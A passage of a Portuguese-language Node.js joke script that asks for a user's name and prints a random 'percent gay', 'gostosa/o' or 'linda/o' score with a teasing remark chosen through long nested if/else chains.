                                          'tenho minha desconfiança...\uD83D\uDE11'
                                      } else {
                                        if (boiola == 37) {
                                          bo =
                                            'tenho minha desconfiança...\uD83D\uDE11'
                                        } else {
                                          if (boiola == 38) {
                                            bo =
                                              'tenho minha desconfiança...\uD83D\uDE11'
                                          } else {
                                            if (boiola == 39) {
                                              bo =
                                                'tenho minha desconfiança...\uD83D\uDE11'
                                            } else {
                                              if (boiola == 40) {
                                                bo =
                                                  'tenho minha desconfiança...\uD83D\uDE11'
                                              } else {
                                                if (boiola == 41) {
                                                  bo = 'você é né?\uD83D\uDE0F'
                                                } else {
                                                  if (boiola == 42) {
                                                    bo =
                                                      'você é né?\uD83D\uDE0F'
                                                  } else {
                                                    if (boiola == 43) {
                                                      bo =
                                                        'você é né?\uD83D\uDE0F'
                                                    } else {
                                                      if (boiola == 44) {
                                                        bo =
                                                          'você é né?\uD83D\uDE0F'
                                                      } else {
                                                        if (boiola == 45) {
                                                          bo =
                                                            'você é né?\uD83D\uDE0F'
                                                        } else {
                                                          if (boiola == 46) {
                                                            bo =
                                                              'você é né?\uD83D\uDE0F'
                                                          } else {
                                                            if (boiola == 47) {
                                                              bo =
                                                                'você é né???'
                                                            } else {
                                                              if (
                                                                boiola == 48
                                                              ) {
                                                                bo =
                                                                  'você é né?\uD83D\uDE0F'
                                                              } else {
                                                                if (
                                                                  boiola == 49
                                                                ) {
                                                                  bo =
                                                                    'você é né?\uD83D\uDE0F'
                                                                } else {
                                                                  if (
                                                                    boiola == 50
                                                                  ) {
                                                                    bo =
                                                                      'você é ou não?\uD83E\uDDD0'
                                                                  } else {
                                                                    boiola >
                                                                      51 &&
                                                                      (bo =
                                                                        'você é gay\uD83D\uDE48')
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        teks =
          '\n\n' + gayname + ' Você é ' + random + '% Gay\n\n' + bo + '\n\n'
        console.log(color(teks, 'yellow'))
      }
      await sleep(5000), main()
      break
    case 'gostosa':
      ;(gostosaame = readline.question('\n\nDigite zeu nome: ')),
        console.clear(),
        (random = '' + Math.floor(Math.random() * 100)),
        (boiola = random)
      if (boiola < 20) {
        bo = 'Você é uma tabuaKKKKKKKKKKKKK'
      } else {
        if (boiola == 21) {
          bo = 'Palito de picolékkkkkkkkk'
        } else {
          if (boiola == 23) {
            bo = 'Palito de picolékkkkkkkkk'
          } else {
            if (boiola == 24) {
              bo = 'Palito de picolékkkkkkkkk'
            } else {
              if (boiola == 25) {
                bo = 'Palito de picolékkkkkkkkk'
              } else {
                if (boiola == 26) {
                  bo = 'Palito de picolékkkkkkkkk'
                } else {
                  if (boiola == 27) {
                    bo = 'Palito de picolékkkkkkkkk'
                  } else {
                    if (boiola == 28) {
                      bo = 'Palito de picolékkkkkkkkk'
                    } else {
                      if (boiola == 29) {
                        bo = 'mt feikkkkkkkkkkk'
                      } else {
                        if (boiola == 30) {
                          bo = 'Palito de picolékkkkkkkkk'
                        } else {
                          if (boiola == 31) {
                            bo = 'você é aceitável \uD83E\uDDD0'
                          } else {
                            if (boiola == 32) {
                              bo = 'você é aceitável \uD83E\uDDD0'
                            } else {
                              if (boiola == 33) {
                                bo = 'você é aceitável \uD83E\uDDD0'
                              } else {
                                if (boiola == 34) {
                                  bo = 'você é aceitável \uD83E\uDDD0'
                                } else {
                                  if (boiola == 35) {
                                    bo = 'você é aceitável \uD83E\uDDD0'
                                  } else {
                                    if (boiola == 36) {
                                      bo = 'você é aceitável \uD83E\uDDD0'
                                    } else {
                                      if (boiola == 37) {
                                        bo = 'você é aceitável \uD83E\uDDD0'
                                      } else {
                                        if (boiola == 38) {
                                          bo = 'você é aceitável \uD83E\uDDD0'
                                        } else {
                                          if (boiola == 39) {
                                            bo = 'você é aceitável \uD83E\uDDD0'
                                          } else {
                                            if (boiola == 40) {
                                              bo =
                                                'você é aceitável \uD83E\uDDD0'
                                            } else {
                                              if (boiola == 41) {
                                                bo =
                                                  'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                              } else {
                                                if (boiola == 42) {
                                                  bo =
                                                    'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                } else {
                                                  if (boiola == 43) {
                                                    bo =
                                                      'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                  } else {
                                                    if (boiola == 44) {
                                                      bo =
                                                        'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                    } else {
                                                      if (boiola == 45) {
                                                        bo =
                                                          'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                      } else {
                                                        if (boiola == 46) {
                                                          bo =
                                                            'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                        } else {
                                                          if (boiola == 47) {
                                                            bo =
                                                              'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                          } else {
                                                            if (boiola == 48) {
                                                              bo =
                                                                'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                            } else {
                                                              if (
                                                                boiola == 49
                                                              ) {
                                                                bo =
                                                                  'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                              } else {
                                                                if (
                                                                  boiola == 50
                                                                ) {
                                                                  bo =
                                                                    'GOSTOSAKKKKKKKKKKKK'
                                                                } else {
                                                                  if (
                                                                    boiola == 51
                                                                  ) {
                                                                    bo =
                                                                      'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                  } else {
                                                                    if (
                                                                      boiola ==
                                                                      52
                                                                    ) {
                                                                      bo =
                                                                        'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                    } else {
                                                                      if (
                                                                        boiola ==
                                                                        53
                                                                      ) {
                                                                        bo =
                                                                          'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                      } else {
                                                                        if (
                                                                          boiola ==
                                                                          54
                                                                        ) {
                                                                          bo =
                                                                            'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                        } else {
                                                                          if (
                                                                            boiola ==
                                                                            55
                                                                          ) {
                                                                            bo =
                                                                              'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                          } else {
                                                                            if (
                                                                              boiola ==
                                                                              56
                                                                            ) {
                                                                              bo =
                                                                                'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                            } else {
                                                                              if (
                                                                                boiola ==
                                                                                57
                                                                              ) {
                                                                                bo =
                                                                                  'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                              } else {
                                                                                if (
                                                                                  boiola ==
                                                                                  58
                                                                                ) {
                                                                                  bo =
                                                                                    'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                } else {
                                                                                  if (
                                                                                    boiola ==
                                                                                    59
                                                                                  ) {
                                                                                    bo =
                                                                                      'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                  } else {
                                                                                    if (
                                                                                      boiola ==
                                                                                      60
                                                                                    ) {
                                                                                      bo =
                                                                                        'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                    } else {
                                                                                      if (
                                                                                        boiola ==
                                                                                        61
                                                                                      ) {
                                                                                        bo =
                                                                                          'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                      } else {
                                                                                        if (
                                                                                          boiola ==
                                                                                          62
                                                                                        ) {
                                                                                          bo =
                                                                                            'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                        } else {
                                                                                          if (
                                                                                            boiola ==
                                                                                            63
                                                                                          ) {
                                                                                            bo =
                                                                                              'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                          } else {
                                                                                            if (
                                                                                              boiola ==
                                                                                              64
                                                                                            ) {
                                                                                              bo =
                                                                                                'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                            } else {
                                                                                              if (
                                                                                                boiola ==
                                                                                                65
                                                                                              ) {
                                                                                                bo =
                                                                                                  'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                              } else {
                                                                                                if (
                                                                                                  boiola ==
                                                                                                  66
                                                                                                ) {
                                                                                                  bo =
                                                                                                    'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                                } else {
                                                                                                  if (
                                                                                                    boiola ==
                                                                                                    67
                                                                                                  ) {
                                                                                                    bo =
                                                                                                      'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                                  } else {
                                                                                                    if (
                                                                                                      boiola ==
                                                                                                      68
                                                                                                    ) {
                                                                                                      bo =
                                                                                                        'Eita q  gostosakkkkkkkkk \uD83D\uDE33'
                                                                                                    } else {
                                                                                                      boiola >
                                                                                                        69 &&
                                                                                                        (bo =
                                                                                                          'quanta gostosura\uD83D\uDE33')
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      console.log(
        color(
          ' ' +
            gostosaame +
            ' Você é ' +
            random +
            '% Gostosa\n\n' +
            bo +
            '\n\n',
          'yellow'
        )
      ),
        await sleep(5000),
        main()
      break
    case 'gostoso':
      ;(gostosaame = readline.question('\n\nDigite zeu nome: ')),
        console.clear(),
        (random = '' + Math.floor(Math.random() * 100)),
        (boiola = random)
      if (boiola < 20) {
        bo = 'Você é uma tabuaKKKKKKKKKKKKK'
      } else {
        if (boiola == 21) {
          bo = 'Palito de picolékkkkkkkkk'
        } else {
          if (boiola == 23) {
            bo = 'Palito de picolékkkkkkkkk'
          } else {
            if (boiola == 24) {
              bo = 'Palito de picolékkkkkkkkk'
            } else {
              if (boiola == 25) {
                bo = 'Palito de picolékkkkkkkkk'
              } else {
                if (boiola == 26) {
                  bo = 'Palito de picolékkkkkkkkk'
                } else {
                  if (boiola == 27) {
                    bo = 'Palito de picolékkkkkkkkk'
                  } else {
                    if (boiola == 28) {
                      bo = 'Palito de picolékkkkkkkkk'
                    } else {
                      if (boiola == 29) {
                        bo = 'mt feikkkkkkkkkkk'
                      } else {
                        if (boiola == 30) {
                          bo = 'Palito de picolékkkkkkkkk'
                        } else {
                          if (boiola == 31) {
                            bo = 'você é aceitável \uD83E\uDDD0'
                          } else {
                            if (boiola == 32) {
                              bo = 'você é aceitável \uD83E\uDDD0'
                            } else {
                              if (boiola == 33) {
                                bo = 'você é aceitável \uD83E\uDDD0'
                              } else {
                                if (boiola == 34) {
                                  bo = 'você é aceitável \uD83E\uDDD0'
                                } else {
                                  if (boiola == 35) {
                                    bo = 'você é aceitável \uD83E\uDDD0'
                                  } else {
                                    if (boiola == 36) {
                                      bo = 'você é aceitável \uD83E\uDDD0'
                                    } else {
                                      if (boiola == 37) {
                                        bo = 'você é aceitável \uD83E\uDDD0'
                                      } else {
                                        if (boiola == 38) {
                                          bo = 'você é aceitável \uD83E\uDDD0'
                                        } else {
                                          if (boiola == 39) {
                                            bo = 'você é aceitável \uD83E\uDDD0'
                                          } else {
                                            if (boiola == 40) {
                                              bo =
                                                'você é aceitável \uD83E\uDDD0'
                                            } else {
                                              if (boiola == 41) {
                                                bo =
                                                  'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                              } else {
                                                if (boiola == 42) {
                                                  bo =
                                                    'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                } else {
                                                  if (boiola == 43) {
                                                    bo =
                                                      'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                  } else {
                                                    if (boiola == 44) {
                                                      bo =
                                                        'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                    } else {
                                                      if (boiola == 45) {
                                                        bo =
                                                          'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                      } else {
                                                        if (boiola == 46) {
                                                          bo =
                                                            'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                        } else {
                                                          if (boiola == 47) {
                                                            bo =
                                                              'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                          } else {
                                                            if (boiola == 48) {
                                                              bo =
                                                                'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                            } else {
                                                              if (
                                                                boiola == 49
                                                              ) {
                                                                bo =
                                                                  'eu pegava \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                              } else {
                                                                if (
                                                                  boiola == 50
                                                                ) {
                                                                  bo =
                                                                    'gostosokkkkkkkkkKKK'
                                                                } else {
                                                                  if (
                                                                    boiola == 51
                                                                  ) {
                                                                    bo =
                                                                      'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                  } else {
                                                                    if (
                                                                      boiola ==
                                                                      52
                                                                    ) {
                                                                      bo =
                                                                        'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                    } else {
                                                                      if (
                                                                        boiola ==
                                                                        53
                                                                      ) {
                                                                        bo =
                                                                          'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                      } else {
                                                                        if (
                                                                          boiola ==
                                                                          54
                                                                        ) {
                                                                          bo =
                                                                            'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                        } else {
                                                                          if (
                                                                            boiola ==
                                                                            55
                                                                          ) {
                                                                            bo =
                                                                              'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                          } else {
                                                                            if (
                                                                              boiola ==
                                                                              56
                                                                            ) {
                                                                              bo =
                                                                                'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                            } else {
                                                                              if (
                                                                                boiola ==
                                                                                57
                                                                              ) {
                                                                                bo =
                                                                                  'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                              } else {
                                                                                if (
                                                                                  boiola ==
                                                                                  58
                                                                                ) {
                                                                                  bo =
                                                                                    'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                } else {
                                                                                  if (
                                                                                    boiola ==
                                                                                    59
                                                                                  ) {
                                                                                    bo =
                                                                                      'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                  } else {
                                                                                    if (
                                                                                      boiola ==
                                                                                      60
                                                                                    ) {
                                                                                      bo =
                                                                                        'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                    } else {
                                                                                      if (
                                                                                        boiola ==
                                                                                        61
                                                                                      ) {
                                                                                        bo =
                                                                                          'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                      } else {
                                                                                        if (
                                                                                          boiola ==
                                                                                          62
                                                                                        ) {
                                                                                          bo =
                                                                                            'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                        } else {
                                                                                          if (
                                                                                            boiola ==
                                                                                            63
                                                                                          ) {
                                                                                            bo =
                                                                                              'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                          } else {
                                                                                            if (
                                                                                              boiola ==
                                                                                              64
                                                                                            ) {
                                                                                              bo =
                                                                                                'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                            } else {
                                                                                              if (
                                                                                                boiola ==
                                                                                                65
                                                                                              ) {
                                                                                                bo =
                                                                                                  'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                              } else {
                                                                                                if (
                                                                                                  boiola ==
                                                                                                  66
                                                                                                ) {
                                                                                                  bo =
                                                                                                    'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                                } else {
                                                                                                  if (
                                                                                                    boiola ==
                                                                                                    67
                                                                                                  ) {
                                                                                                    bo =
                                                                                                      'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                                  } else {
                                                                                                    if (
                                                                                                      boiola ==
                                                                                                      68
                                                                                                    ) {
                                                                                                      bo =
                                                                                                        'Eita q  gostosokkkkkkkkk \uD83D\uDE33'
                                                                                                    } else {
                                                                                                      boiola >
                                                                                                        69 &&
                                                                                                        (bo =
                                                                                                          'quanta gostosura\uD83D\uDE33')
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      console.log(
        color(
          ' ' +
            gostosaame +
            ' Você é ' +
            random +
            '% Gostoso\n\n' +
            bo +
            '\n\n',
          'blue'
        )
      ),
        await sleep(5000),
        main()
      break
    case 'linda':
      ;(lindaname = readline.question('\n\nDigite zeu nome: ')),
        console.clear(),
        (random = '' + Math.floor(Math.random() * 100)),
        (boiola = random)
      if (boiola < 20) {
        bo = 'ESPELHO QUEBROUKKKKKKKKKKKKK'
      } else {
        if (boiola == 21) {
          bo = 'fionakkk'
        } else {
          if (boiola == 23) {
            bo = 'Dragãokkkkkkkkk'
          } else {
            if (boiola == 24) {
              bo = 'Dragãokkkkkkkkk'
            } else {
              if (boiola == 25) {
                bo = 'Dragãokkkkkkkkk'
              } else {
                if (boiola == 26) {
                  bo = 'Dragãokkkkkkkkk'
                } else {
                  if (boiola == 27) {
                    bo = 'Dragãokkkkkkkkk'
                  } else {
                    if (boiola == 28) {
                      bo = 'Dragãokkkkkkkkk'
                    } else {
                      if (boiola == 29) {
                        bo = 'mt feikkkkkkkkkkk'
                      } else {
                        if (boiola == 30) {
                          bo = 'Dragãokkkkkkkkk'
                        } else {
                          if (boiola == 31) {
                            bo = 'Melhor que nada \uD83E\uDDD0'
                          } else {
                            if (boiola == 32) {
                              bo = 'Melhor que nada \uD83E\uDDD0'
                            } else {
                              if (boiola == 33) {
                                bo = 'Melhor que nada \uD83E\uDDD0'
                              } else {
                                if (boiola == 34) {
                                  bo = 'Melhor que nada \uD83E\uDDD0'
                                } else {
                                  if (boiola == 35) {
                                    bo = 'Melhor que nada \uD83E\uDDD0'
                                  } else {
                                    if (boiola == 36) {
                                      bo = 'Melhor que nada \uD83E\uDDD0'
                                    } else {
                                      if (boiola == 37) {
                                        bo = 'Melhor que nada \uD83E\uDDD0'
                                      } else {
                                        if (boiola == 38) {
                                          bo = 'Melhor que nada \uD83E\uDDD0'
                                        } else {
                                          if (boiola == 39) {
                                            bo = 'Melhor que nada \uD83E\uDDD0'
                                          } else {
                                            if (boiola == 40) {
                                              bo =
                                                'Melhor que nada \uD83E\uDDD0'
                                            } else {
                                              if (boiola == 41) {
                                                bo =
                                                  'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                              } else {
                                                if (boiola == 42) {
                                                  bo =
                                                    'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                } else {
                                                  if (boiola == 43) {
                                                    bo =
                                                      'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                  } else {
                                                    if (boiola == 44) {
                                                      bo =
                                                        'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                    } else {
                                                      if (boiola == 45) {
                                                        bo =
                                                          'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                      } else {
                                                        if (boiola == 46) {
                                                          bo =
                                                            'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                        } else {
                                                          if (boiola == 47) {
                                                            bo =
                                                              'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                          } else {
                                                            if (boiola == 48) {
                                                              bo =
                                                                'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                            } else {
                                                              if (
                                                                boiola == 49
                                                              ) {
                                                                bo =
                                                                  'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                              } else {
                                                                if (
                                                                  boiola == 50
                                                                ) {
                                                                  bo =
                                                                    'GOSTOSAKKKKKKKKKKKK'
                                                                } else {
                                                                  if (
                                                                    boiola == 51
                                                                  ) {
                                                                    bo =
                                                                      'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                  } else {
                                                                    if (
                                                                      boiola ==
                                                                      52
                                                                    ) {
                                                                      bo =
                                                                        'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                    } else {
                                                                      if (
                                                                        boiola ==
                                                                        53
                                                                      ) {
                                                                        bo =
                                                                          'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                      } else {
                                                                        if (
                                                                          boiola ==
                                                                          54
                                                                        ) {
                                                                          bo =
                                                                            'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                        } else {
                                                                          if (
                                                                            boiola ==
                                                                            55
                                                                          ) {
                                                                            bo =
                                                                              'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                          } else {
                                                                            if (
                                                                              boiola ==
                                                                              56
                                                                            ) {
                                                                              bo =
                                                                                'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                            } else {
                                                                              if (
                                                                                boiola ==
                                                                                57
                                                                              ) {
                                                                                bo =
                                                                                  'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                              } else {
                                                                                if (
                                                                                  boiola ==
                                                                                  58
                                                                                ) {
                                                                                  bo =
                                                                                    'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                } else {
                                                                                  if (
                                                                                    boiola ==
                                                                                    59
                                                                                  ) {
                                                                                    bo =
                                                                                      'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                  } else {
                                                                                    if (
                                                                                      boiola ==
                                                                                      60
                                                                                    ) {
                                                                                      bo =
                                                                                        'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                    } else {
                                                                                      if (
                                                                                        boiola ==
                                                                                        61
                                                                                      ) {
                                                                                        bo =
                                                                                          'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                      } else {
                                                                                        if (
                                                                                          boiola ==
                                                                                          62
                                                                                        ) {
                                                                                          bo =
                                                                                            'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                        } else {
                                                                                          if (
                                                                                            boiola ==
                                                                                            63
                                                                                          ) {
                                                                                            bo =
                                                                                              'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                          } else {
                                                                                            if (
                                                                                              boiola ==
                                                                                              64
                                                                                            ) {
                                                                                              bo =
                                                                                                'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                            } else {
                                                                                              if (
                                                                                                boiola ==
                                                                                                65
                                                                                              ) {
                                                                                                bo =
                                                                                                  'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                              } else {
                                                                                                if (
                                                                                                  boiola ==
                                                                                                  66
                                                                                                ) {
                                                                                                  bo =
                                                                                                    'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                                } else {
                                                                                                  if (
                                                                                                    boiola ==
                                                                                                    67
                                                                                                  ) {
                                                                                                    bo =
                                                                                                      'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                                  } else {
                                                                                                    if (
                                                                                                      boiola ==
                                                                                                      68
                                                                                                    ) {
                                                                                                      bo =
                                                                                                        'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                                    } else {
                                                                                                      boiola >
                                                                                                        69 &&
                                                                                                        (bo =
                                                                                                          'bó casa?\uD83D\uDE33')
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      console.log(
        color(
          '\n\n' +
            lindaname +
            ' Você é ' +
            random +
            '% linda\n\n' +
            bo +
            '\n\n',
          'magenta'
        )
      ),
        await sleep(5000),
        main()
      break
    case 'lindo':
      ;(lindaname = readline.question('\n\nDigite seu nome: ')),
        console.clear(),
        (random = '' + Math.floor(Math.random() * 100)),
        (boiola = random)
      if (boiola < 20) {
        bo = 'ESPELHO QUEBROUKKKKKKKKKKKKK'
      } else {
        if (boiola == 21) {
          bo = 'fionakkk'
        } else {
          if (boiola == 23) {
            bo = 'Dragãokkkkkkkkk'
          } else {
            if (boiola == 24) {
              bo = 'Dragãokkkkkkkkk'
            } else {
              if (boiola == 25) {
                bo = 'Dragãokkkkkkkkk'
              } else {
                if (boiola == 26) {
                  bo = 'Dragãokkkkkkkkk'
                } else {
                  if (boiola == 27) {
                    bo = 'Dragãokkkkkkkkk'
                  } else {
                    if (boiola == 28) {
                      bo = 'Dragãokkkkkkkkk'
                    } else {
                      if (boiola == 29) {
                        bo = 'mt feikkkkkkkkkkk'
                      } else {
                        if (boiola == 30) {
                          bo = 'Dragãokkkkkkkkk'
                        } else {
                          if (boiola == 31) {
                            bo = 'Melhor que nada \uD83E\uDDD0'
                          } else {
                            if (boiola == 32) {
                              bo = 'Melhor que nada \uD83E\uDDD0'
                            } else {
                              if (boiola == 33) {
                                bo = 'Melhor que nada \uD83E\uDDD0'
                              } else {
                                if (boiola == 34) {
                                  bo = 'Melhor que nada \uD83E\uDDD0'
                                } else {
                                  if (boiola == 35) {
                                    bo = 'Melhor que nada \uD83E\uDDD0'
                                  } else {
                                    if (boiola == 36) {
                                      bo = 'Melhor que nada \uD83E\uDDD0'
                                    } else {
                                      if (boiola == 37) {
                                        bo = 'Melhor que nada \uD83E\uDDD0'
                                      } else {
                                        if (boiola == 38) {
                                          bo = 'Melhor que nada \uD83E\uDDD0'
                                        } else {
                                          if (boiola == 39) {
                                            bo = 'Melhor que nada \uD83E\uDDD0'
                                          } else {
                                            if (boiola == 40) {
                                              bo =
                                                'Melhor que nada \uD83E\uDDD0'
                                            } else {
                                              if (boiola == 41) {
                                                bo =
                                                  'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                              } else {
                                                if (boiola == 42) {
                                                  bo =
                                                    'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                } else {
                                                  if (boiola == 43) {
                                                    bo =
                                                      'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                  } else {
                                                    if (boiola == 44) {
                                                      bo =
                                                        'Bonitinha você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                    } else {
                                                      if (boiola == 45) {
                                                        bo =
                                                          'BonitinhO você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                      } else {
                                                        if (boiola == 46) {
                                                          bo =
                                                            'Bonitinho você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                        } else {
                                                          if (boiola == 47) {
                                                            bo =
                                                              'Bonitinho você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                          } else {
                                                            if (boiola == 48) {
                                                              bo =
                                                                'Bonitinho você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                            } else {
                                                              if (
                                                                boiola == 49
                                                              ) {
                                                                bo =
                                                                  'Bonitinho você \uD83D\uDE33\uD83D\uDE33\uD83D\uDE33'
                                                              } else {
                                                                if (
                                                                  boiola == 50
                                                                ) {
                                                                  bo =
                                                                    'GOSTOSOKKKKKKKKKKKK'
                                                                } else {
                                                                  if (
                                                                    boiola == 51
                                                                  ) {
                                                                    bo =
                                                                      'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                  } else {
                                                                    if (
                                                                      boiola ==
                                                                      52
                                                                    ) {
                                                                      bo =
                                                                        'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                    } else {
                                                                      if (
                                                                        boiola ==
                                                                        53
                                                                      ) {
                                                                        bo =
                                                                          'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                      } else {
                                                                        if (
                                                                          boiola ==
                                                                          54
                                                                        ) {
                                                                          bo =
                                                                            'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                        } else {
                                                                          if (
                                                                            boiola ==
                                                                            55
                                                                          ) {
                                                                            bo =
                                                                              'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                          } else {
                                                                            if (
                                                                              boiola ==
                                                                              56
                                                                            ) {
                                                                              bo =
                                                                                'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                            } else {
                                                                              if (
                                                                                boiola ==
                                                                                57
                                                                              ) {
                                                                                bo =
                                                                                  'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                              } else {
                                                                                if (
                                                                                  boiola ==
                                                                                  58
                                                                                ) {
                                                                                  bo =
                                                                                    'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                } else {
                                                                                  if (
                                                                                    boiola ==
                                                                                    59
                                                                                  ) {
                                                                                    bo =
                                                                                      'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                  } else {
                                                                                    if (
                                                                                      boiola ==
                                                                                      60
